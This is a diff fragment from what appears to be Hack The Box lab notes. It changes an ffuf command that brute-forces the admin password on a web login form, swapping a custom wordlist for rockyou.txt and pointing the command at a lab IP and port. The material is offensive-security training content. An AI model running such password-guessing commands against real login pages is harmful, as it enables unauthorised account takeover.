@@ -17,7 +17,7 @@ alakin2504@htb[/htb]$ wc -l custom_wordlist.txt
 
 
 ```shell-session
-alakin2504@htb[/htb]$ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
+alakin2504@htb[/htb]$ ffuf -w ./usr/share/wordlists/rockyou.txt -u http://94.237.55.96:52387/login -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password"
 
 <SNIP>
 
